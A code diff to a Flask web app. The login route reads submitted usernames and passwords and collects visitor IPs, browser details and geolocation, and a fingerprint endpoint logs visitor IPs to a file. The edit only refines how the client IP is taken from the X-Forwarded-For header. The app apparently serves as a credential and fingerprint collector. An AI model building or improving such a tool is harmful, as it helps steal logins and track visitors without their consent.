@@ -5,6 +5,7 @@ import json
 
 app = Flask(__name__)
 
+# Get public IP location using ipapi.co
 def get_location(ip):
     try:
         response = requests.get(f"https://ipapi.co/{ip}/json/")
@@ -31,7 +32,10 @@ def index():
 def login():
     username = request.form.get('username')
     password = request.form.get('password')
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+
+    # ✅ Get accurate external IP address
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+
     user_agent = request.headers.get('User-Agent', 'Unknown')
     referrer = request.referrer or "None"
     lang = request.headers.get('Accept-Language', 'Unknown')
@@ -73,7 +77,7 @@ def login():
 @app.route('/fingerprint', methods=['POST'])
 def fingerprint():
     data = request.get_json()
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     with open("fingerprints.txt", "a") as f:
         f.write(f"[{timestamp}] From IP: {ip}\n")
